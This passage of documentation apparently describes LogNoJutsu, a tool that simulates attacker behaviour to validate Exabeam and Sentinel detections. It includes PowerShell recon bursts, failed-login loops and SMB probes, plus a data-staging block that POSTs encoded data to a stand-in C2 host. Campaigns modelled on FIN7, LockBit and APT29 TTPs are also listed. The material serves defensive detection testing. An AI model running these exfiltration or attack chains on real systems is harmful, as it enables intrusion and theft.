- Exabeam: Brute Force / Credential Stuffing Use Case

---

#### UEBA-OFFHOURS — Off-Hours Activity Simulation

| Property | Value |
|---|---|
| UEBA Use Case | Abnormal Activity Time (Exabeam: Compromised Credentials & Abnormal Auth) |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Standard recon activities — content is secondary, timestamp decides
whoami /all; net user; ipconfig /all
Get-Process | Select-Object -First 10
Get-ChildItem $env:USERPROFILE
```

**UEBA detection logic:** Exabeam uses a **Numerical Time-of-Week Model** — it learns the normal working hours of a user from historical 4624 events (typically 08:00–18:00 Mon–Fri). Activity outside this baseline increases the session risk score. The model treats Sunday 23:00 as similar to Monday 00:00 (cyclic time model).

> **Note:** For maximum detection effectiveness, run outside regular business hours. The tool outputs the current time in the log.

**Expected SIEM Events:**
- `4688` / `Sysmon 1` — Processes outside baseline working hours
- Exabeam: "Abnormal activity time for user"

---

#### UEBA-LATERAL-CHAIN — Lateral Movement Discovery Chain

| Property | Value |
|---|---|
| UEBA Use Case | Reconnaissance / First-Time-Seen Behavior (Exabeam: Lateral Movement) |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

12 enumeration commands in rapid succession (~300ms interval):

```powershell
whoami /groups          # User groups
net user                # Local users
net localgroup administrators
net config workstation  # Domain info
ipconfig /all           # Network configuration
netstat -ano            # Active connections
arp -a                  # ARP cache (neighbor hosts)
route print             # Routing table
ipconfig /displaydns    # DNS cache
net share               # Shared resources
net session             # Active sessions
tasklist /v             # Running processes
```

**UEBA detection logic:** Exabeam detects this pattern on two levels:
1. **First-Time-Seen (Categorical Model):** When a user executes `netstat.exe`, `arp.exe`, or `net.exe` for the first time, the risk score increases significantly
2. **Volume Anomaly (Numerical Clustered Model):** 12 network/system queries in ~4 seconds is far outside normal user activity

**Expected SIEM Events:**
- `4688` / `Sysmon 1` × 12 — Rapid process sequence of `net.exe`, `netstat.exe`, `arp.exe`, `ipconfig.exe`
- Exabeam: "First time user executed network reconnaissance commands"

---

#### UEBA-DATA-STAGING — Data Staging + Exfiltration Chain

| Property | Value |
|---|---|
| UEBA Use Case | Data Exfiltration / Abnormal Data Movement (Exabeam Package: Data Exfiltration) |
| Admin Required | No |
| Cleanup | Staging directory removed |

**What is executed:**

```powershell
# Step 1: Create synthetic files in staging directory
$stageDir = "$env:TEMP\lnj_stage"
New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
for ($i = 1; $i -le 5; $i++) {
    Set-Content -Path "$stageDir\sensitive_doc_$i.txt" -Value "CONFIDENTIAL DATA FILE $i`n$("A" * 1000)"
}

# Step 2: Base64 encode the collected file list for exfiltration
$stagedFiles = Get-ChildItem $stageDir | Select-Object Name, Length, LastWriteTime
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($stagedFiles | ForEach-Object { $_.Name }) -join "`n"))

# Step 3: HTTP POST exfiltration to C2 (Sysmon EID 3 + EID 11)
try {
    Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/exfil" -Method POST -Body $encoded -TimeoutSec 3 -ErrorAction Stop | Out-Null
} catch {
    Write-Host "Exfil connection failed (expected — no real C2 traffic)"
}
```

**UEBA detection logic:** Exabeam detects unusual amounts of data being copied into a staging directory and subsequently exfiltrated via HTTP. The combination of file collection and outgoing connection in the same session increases the risk score.

**Expected SIEM Events:**
- `4104` — ScriptBlock: file staging loop copies data into TEMP directory
- `Sysmon 11` — FileCreate: staging files created in collection directory
- `Sysmon 3` — NetworkConnect: HTTP POST exfiltration attempt to C2 host

---

#### UEBA-ACCOUNT-TAKEOVER — Account Takeover Chain

| Property | Value |
|---|---|
| UEBA Use Case | Account Compromise / Credential Stuffing Chain (Exabeam Package: Compromised Credentials) |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Step 1: 5 failed authentication attempts in rapid succession (EID 4625)
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
for ($i = 1; $i -le 5; $i++) {
    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $ctx.ValidateCredentials("takeover_test_user", "WrongPass$i!") | Out-Null
    Start-Sleep -Milliseconds 200
}

# Step 2: Log session context (existing authenticated session)
Write-Host "Current time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"

# Step 3: Post-auth enumeration burst — rapid recon after account access (EID 4688)
whoami /all; ipconfig /all; net user; net localgroup administrators
```

**UEBA detection logic:** Exabeam correlates failed logon attempts (4625) with a subsequent successful logon and immediate enumeration activity. The transition from spray to recon is the core pattern for account takeover.

**Expected SIEM Events:**
- `4625` × 5 in rapid succession — brute force precursor (Exabeam: Credential Stuffing)
- `4624` — Logon event: existing session (Exabeam: new session after failed attempts)
- `4688` — Post-auth enumeration burst: `whoami`, `ipconfig`, `net user` in rapid succession

---

#### UEBA-PRIV-ESC — Privilege Escalation Chain

| Property | Value |
|---|---|
| UEBA Use Case | Abnormal Privilege Use (Exabeam Package: Privilege Escalation) |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Step 1: Enumerate current privileges (EID 4688 — whoami /priv)
whoami /priv

# Step 2: Check group memberships (EID 4688 — whoami /groups)
whoami /groups

# Step 3: Enumerate local administrators group (EID 4688 — net localgroup)
net localgroup administrators

# Step 4: .NET API privilege check (EID 4104 — WindowsIdentity)
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "User: $($identity.Name) | Administrator: $isAdmin"
```

**UEBA detection logic:** Exabeam detects when a normal user executes administrator tools (`whoami /priv`, `net localgroup administrators`) and performs token checks. The accumulation of privilege enumeration in a short time triggers the Privilege Escalation use case.

**Expected SIEM Events:**
- `4688` — `whoami.exe /priv` — privilege enumeration (Exabeam: abnormal admin tool use)
- `4688` — `net.exe localgroup administrators` — admin group check
- `4104` — ScriptBlock: `WindowsIdentity` privilege check via .NET API
- `4672` — Special privileges assigned at new logon (if executed with privileged account)

---

#### UEBA-LATERAL-NEW-ASSET — Lateral Movement + New Asset Access

| Property | Value |
|---|---|
| UEBA Use Case | First-Time Asset Access / Lateral Movement (Exabeam Package: Lateral Movement) |
| Admin Required | No |
| Cleanup | SMB connection removed |

**What is executed:**

```powershell
# Step 1: SMB admin share access attempt (EID 5140 + Sysmon EID 3 on Port 445)
net use \\127.0.0.1\C$ 2>&1

# Step 2: Enumerate shares on target host (EID 4688 — net view)
net view \\127.0.0.1 2>&1

# Step 3: Check active sessions (EID 4688 — net session)
net session 2>&1

# Step 4: SMB port probe — Port 445 (Sysmon EID 3 — network connection)
$smb = Test-NetConnection -ComputerName 127.0.0.1 -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue
Write-Host "SMB Port 445 reachable: $smb"

# Step 5: RDP port probe — Port 3389 (Sysmon EID 3 — lateral movement via RDP)
$rdp = Test-NetConnection -ComputerName 127.0.0.1 -Port 3389 -InformationLevel Quiet -WarningAction SilentlyContinue
Write-Host "RDP Port 3389 reachable: $rdp"
```

**UEBA detection logic:** Exabeam uses a first-time-seen model for host accesses. When a user accesses an internal host for the first time via SMB (Port 445) or RDP (Port 3389), this is treated as anomalous behavior and increases the session risk score.

**Expected SIEM Events:**
- `5140` — Network share object accessed: SMB share access attempt (Exabeam: new asset access)
- `4688` — `net.exe use/view` — share enumeration on target host
- `Sysmon 3` — NetworkConnect: Port 445 SMB connection attempt
- `4624` — Logon event: network logon Type 3 on successful share access

---

## Campaigns / Playbooks

Campaigns are ordered sequences of techniques that replicate real attacker TTPs. They are selected in the web UI in the "Playbooks" tab.

### Overview

| Campaign | Category | Threat Actor | Steps |
|---|---|---|---|
| `finance-fin7` | Industry | FIN7 / Carbanak | 10 |
| `healthcare-ransomware` | Industry | Conti / LockBit | 10 |
| `manufacturing-apt` | Industry | Sandworm / TEMP.Veles | 11 |
| `energy-longdwell` | Industry | Volt Typhoon / Dragonfly | 10 |
| `retail-pos` | Industry | FIN7 POS variant | 10 |
| `government-apt` | Industry | APT29 / APT28 | 14 |
| `ueba-exabeam-validation` | UEBA | Generic | 10 |
| `lateral-movement-credential-theft` | Exabeam Validation | APT Lateral Movement | 9 |
| `account-manipulation-persistence` | Exabeam Validation | APT Post-Exploitation | 7 |
| `defense-evasion-lolbin` | Exabeam Validation | Sophisticated APT | 8 |
| `ransomware-full-chain` | Exabeam Validation | LockBit / Conti TTPs | 10 |
| `insider-threat` | Exabeam Validation | Malicious Insider | 9 |

---

### Industry Campaigns

#### finance-fin7 — Finance / FIN7 Carbanak
Simulates the TTPs of the FIN7/Carbanak group, which specializes in financial institutions. Includes spear-phishing follow-up actions, PowerShell backdoors, credential dumping, and lateral movement to payment systems.

Steps: T1082 → T1087 → T1057 → T1059.001 → T1003.001 → T1021.001 → T1053.005 → T1547.001 → T1562.002 → T1070.001

#### healthcare-ransomware — Healthcare / Conti LockBit
Simulates ransomware attacks on healthcare environments (common because patient data is critical and often poorly protected). Focus on discovery, credential harvesting, disabling backups, and simulating the encryption phase.

Steps: T1082 → T1083 → T1087 → T1003.001 → T1059.001 → T1547.001 → T1562.002 → T1490 → T1486 → T1070.001

#### manufacturing-apt — Manufacturing / Sandworm
Simulates APT attacks on manufacturing environments (ICS/SCADA context). Long dwell time, service installation for persistence, targeted system discovery.

Steps: T1082 → T1016 → T1049 → T1057 → T1083 → T1087 → T1059.001 → T1543.003 → T1562.002 → T1070.001 → T1490

#### energy-longdwell — Energy / Volt Typhoon Dragonfly
Simulates long-dwell APT attacks on energy companies (critical infrastructure). Characteristic: slow recon, minimal footprint, living-off-the-land.

Steps: T1082 → T1049 → T1016 → T1057 → T1087 → T1083 → T1059.001 → T1547.001 → T1562.002 → T1070.001

#### retail-pos — Retail / FIN7 POS
Simulates POS system attacks in retail. Focus on credential harvesting, lateral movement to POS terminals, and persistence.

Steps: T1082 → T1087 → T1057 → T1049 → T1059.001 → T1003.001 → T1547.001 → T1053.005 → T1562.002 → T1070.001

#### government-apt — Government / APT29 APT28
Simulates nation-state APT attacks on government agencies (14 steps — most comprehensive industry campaign). Covers the complete kill chain from discovery through credential access to persistence and defense evasion.

Steps: T1082 → T1087 → T1069 → T1049 → T1016 → T1057 → T1083 → T1059.001 → T1003.001 → T1547.001 → T1053.005 → T1543.003 → T1562.002 → T1070.001

---

### Exabeam Validation Campaigns

These four campaigns are directly aligned with the Exabeam Use Case Library and specifically test the highest rule coverages.

#### ueba-exabeam-validation — Exabeam UEBA Validation Suite
Structured validation of all important Exabeam UEBA use cases after onboarding:

```
T1082              → Generate baseline activity
T1016              → Generate baseline activity
UEBA-OFFHOURS      → Use Case: Abnormal Activity Time
UEBA-LATERAL-CHAIN → Use Case: First-Time Recon Behavior
UEBA-SPRAY-CHAIN   → Use Case: Brute Force / Credential Stuffing
T1053.005          → Anomaly: New Scheduled Task
T1547.001          → Anomaly: New Registry Run Key
T1003.001          → Use Case: Credential Dumping Precursor
T1562.002          → Use Case: Defense Evasion
T1070.001          → Use Case: Log Clearing
```

#### lateral-movement-credential-theft — Lateral Movement & Credential Theft Chain
Covers Exabeam's Lateral Movement use case (118 rules for T1021) and Credential Access (49 rules for T1003). Simulates the complete path from initial enumeration through Kerberoasting to DCSync recon.

```
T1087  → Account Discovery
T1069  → Permission Groups
T1482  → Domain Trust Discovery (nltest)
T1135  → Network Share Discovery
T1558.003 → Kerberoasting (Event 4769)
T1003.001 → LSASS Access (Sysmon 10)
T1550.002 → Pass-the-Hash Pattern (Event 4648)
T1021.001 → RDP Lateral Movement
T1003.006 → DCSync Recon
```

#### account-manipulation-persistence — Account Manipulation & Persistence
Directly covers Exabeam's Account Manipulation use case (T1098 = 57 rules, T1136 = 35 rules). Validates all important persistence mechanisms in one campaign.

```
T1136.001  → Create Local Account (Event 4720)
T1098      → Add to Administrators (Event 4732)
T1547.001  → Registry Run Key
T1053.005  → Scheduled Task (Event 4698)
T1543.003  → New Service (Event 7045)
T1197      → BITS Jobs
T1546.003  → WMI Event Subscription (Sysmon 19/20/21)
```

#### defense-evasion-lolbin — Defense Evasion & LOLBin
Covers Exabeam's Evasion use case. Focus on Living-off-the-Land binaries (LOLBins) and obfuscation techniques. T1218 has 116 Exabeam rules — the second-highest coverage after T1078.

```
T1027      → Obfuscated/Encoded Commands (4104)
T1218.011  → Rundll32 LOLBin (Sysmon 7)
T1059.003  → cmd.exe Shell (4688)
T1047      → WMI Execution (WmiPrvSE parent)
T1036.005  → Process Masquerading (Sysmon 1 path anomaly)
T1548.002  → UAC Bypass eventvwr (Sysmon 12/13)
T1562.002  → Disable Event Logging (4719)
T1070.001  → Clear Logs (wevtutil)
```

#### ransomware-full-chain — Ransomware Full Attack Chain
Simulates a complete ransomware kill chain from discovery to simulation of the encryption phase. Covers all documented Exabeam Ransomware Correlation Rules (bcdedit, vssadmin, mass renaming).

```
T1082      → System Discovery
T1083      → File Discovery (target identification)
T1057      → Process Discovery (security tools)
T1552.001  → Credentials in Files
T1059.001  → PowerShell encoded payload
T1027      → Obfuscated commands
T1562.002  → Disable Logging (pre-encryption evasion)
T1490      → Inhibit Recovery (vssadmin list, bcdedit pattern)
T1486      → Data Encrypted for Impact (mass rename + ransom note)
T1070.001  → Clear Logs (post-encryption cleanup)
```

#### insider-threat — Insider Threat Simulation
Simulates a malicious insider (e.g., a departing employee) during data exfiltration preparation. Targets Exabeam's Malicious Insider Package. **Recommended: Run with a dedicated user profile (User Rotation) to generate authentic UEBA behavioral anomalies.**

```
T1082      → System Discovery
T1087      → Account Discovery
T1083      → File Discovery (sensitive data location)
T1135      → Network Share Discovery
T1552.001  → Credentials in Files (staging data)
T1057      → Process Discovery (avoiding monitoring)
T1059.001  → PowerShell (data collection scripts)
T1027      → Obfuscated commands
T1070.001  → Log Clearing (covering tracks)
```

---

## Logging and Reporting

### Simulation Log (`.log`)

For each simulation, a text file is created in the format `lognojutsu_YYYYMMDD_HHMMSS_[campaign].log` in the same directory as the `.exe`.

| Log Type | Description |
|---|---|
| `SIM_START` | Simulation start with configuration details |
| `PHASE` | Phase change (Discovery / Attack / Cleanup) |
| `TECH_START` | Start of a technique (ID, name, tactic) |
| `COMMAND` | Executed command (executor type + command line) |
| `OUTPUT` | Complete stdout output of the technique |
| `ERROR` | stderr output (if present) |
| `CLEANUP` | Executed cleanup command and result |
| `TECH_END` | Completion of the technique with duration and success status |
| `SIM_END` | Summary (X/Y techniques successful) |

**Example log excerpt:**
```
[2026-03-21 22:00:00.000] [SIM_START   ] === LogNoJutsu Simulation Started ===
[2026-03-21 22:00:00.001] [INFO        ] Configuration: rotation=sequential profiles=2
[2026-03-21 22:00:00.002] [PHASE       ] ▶ PHASE: DISCOVERY
[2026-03-21 22:00:00.003] [TECH_START  ] [START] T1082 — System Information Discovery (as: CORP\jsmith)
[2026-03-21 22:00:00.004] [COMMAND     ]   Executor: powershell
[2026-03-21 22:00:01.200] [OUTPUT      ]   OS Name: Microsoft Windows 11 Pro
[2026-03-21 22:00:01.210] [TECH_END    ] [END] T1082 — SUCCESS ✓ (1.207s)
```

### JSON Report (`.json`)

Additionally, `lognojutsu_report_YYYYMMDD_HHMMSS.json` is created:
- Overall statistics: Total / Successful / Failed
- Per technique: ID, name, tactic, start/end, success, stdout, stderr, cleanup status, executing user (`run_as_user`)

### HTML Report (`.html`)

After each simulation, `lognojutsu_report_YYYYMMDD_HHMMSS.html` is additionally generated — a complete simulation report in dark theme format:

| Section | Content |
|---|---|
| **Summary Grid** | 4 tiles: Total techniques / Successful / Failed / Duration |
| **Tactic Heatmap** | Per ATT&CK tactic: number of techniques + success rate as colored bar |
| **Results Table** | Each technique with ID, tactic, executing user, duration, success/failure, output excerpt |
| **WhatIf Badge** | Visible indicator when simulation was run in WhatIf mode |

**Access:**
- Open file directly in the working directory
- In the web UI: Tab "Results" → Button **"Open HTML Report"** (appears after simulation)
- API: `GET /api/report` — returns the last HTML report inline

---

## Cleanup Mechanism

### Techniques with Cleanup

| Technique | Created Artifact | Cleanup |
|---|---|---|
| T1136.001 | Local account `lnj_test_acct` | `net user lnj_test_acct /delete` |
| T1098 | Account in Administrators group | Group membership + account removed |
| T1547.001 | Registry key `HKCU\...\Run\LogNoJutsu_Persistence_Test` | Registry entry deleted |
| T1053.005 | Scheduled task `LogNoJutsu_Task_Test` | Task deregistered |
| T1543.003 | Windows service `LogNoJutsuTestSvc` | Service deleted |
| T1548.002 | Registry key `HKCU\Software\Classes\mscfile\...` | Registry tree removed |
| T1197 | BITS job `LogNoJutsu_BITS_Test` | Job cancelled |
| T1546.003 | WMI Filter, Consumer, Binding | All three WMI objects removed |
| T1036.005 | Temporary binaries in `%TEMP%\LNJ_Masq\` + Run key | Directory + registry removed |
| T1486 | AES-encrypted files + ransom note in `%TEMP%\LNJ_T1486\` | Directory removed |
| T1490 | Boot recovery disabled, SystemRestore registry | bcdedit restored, keys removed |
| T1562.002 | Audit policy disabled, wevtutil channels, MaxSize registry | Backup restore + channels reactivated |
| T1550.002 | Network connections via `net use` | `net use * /delete` |

### Cleanup Modes

**Mode 1 — Per-Technique Cleanup (Default, checkbox active):**
After each technique, the associated cleanup is executed immediately. Artifacts only exist during technique execution.

**Mode 2 — End-of-Simulation Cleanup (Checkbox inactive):**
All artifacts remain throughout the entire simulation and are removed collectively at the end. Useful when the SIEM should also test persistence detection over time.

**Mode 3 — Abort Cleanup (Stop & Cleanup button):**
If the simulation is manually aborted, a complete cleanup of all techniques executed so far is automatically performed.

---

## SIEM Platform-Specific Prerequisites

### Microsoft Sentinel

LogNoJutsu includes techniques with the `AZURE_` prefix that specifically generate Windows Security Events recognized by Microsoft Sentinel's built-in Analytic Rules. These techniques run locally on the Windows system — no Azure connectivity is required at runtime.

**Prerequisites:**

| Component | Description |
|------------|-------------|
| Azure Monitor Agent (AMA) | Installed on the test system and connected to the Log Analytics Workspace. MMA (Log Analytics Agent) is also supported but has been marked as deprecated by Microsoft. |
| Windows Security Events Connector | Enabled in Microsoft Sentinel — forwards Security channel events (4662, 4688, 4769) to the SecurityEvent table |
| Analytic Rules | The following built-in rules must be enabled in Sentinel: |

**Recommended Sentinel Analytic Rules:**

- **Potential Kerberoasting** — detects bulk TGS requests with RC4 encryption (EID 4769, EncryptionType=0x17)
- **Non Domain Controller Active Directory Replication** — detects replication requests from non-DC systems (EID 4662 with DS-Replication GUIDs)
- **Dumping LSASS Process Into a File** — detects LSASS memory accesses (EID 4656/4663)

**AZURE_ Techniques:**

| Technique | MITRE ATT&CK | Sentinel Analytic Rule | Primary Event |
|---------|-------------|----------------------|-------------|
| AZURE_kerberoasting | T1558.003 | Potential Kerberoasting | EID 4769 |
| AZURE_ldap_recon | T1087.002 | Anomalous LDAP Activity | EID 4688 |
| AZURE_dcsync | T1003.006 | Non Domain Controller Active Directory Replication | EID 4662 |

> **Note:** The AZURE_ techniques require a domain-joined Windows system with Active Directory. On standalone systems, the AD-related events are not generated.

---

## Command-Line Options

```
lognojutsu.exe [options]

Options:
  -host string
        Bind address for the HTTP server (default: "127.0.0.1")
        For network access: 0.0.0.0

  -port int
        HTTP port (default: 8080)

  -password string
        Optional password for the web UI (HTTP Basic Auth)
        Leave empty = no authentication

Examples:
  lognojutsu.exe
        Starts with default settings (localhost only, port 8080)

  lognojutsu.exe -host 0.0.0.0 -port 9090
        Accessible on the entire network on port 9090

  lognojutsu.exe -host 0.0.0.0 -password "Simulation2026!"
        Network access with password protection
```

---

*LogNoJutsu is a tool exclusively for authorized SIEM validation in controlled test environments. Use on systems without explicit authorization is prohibited.*
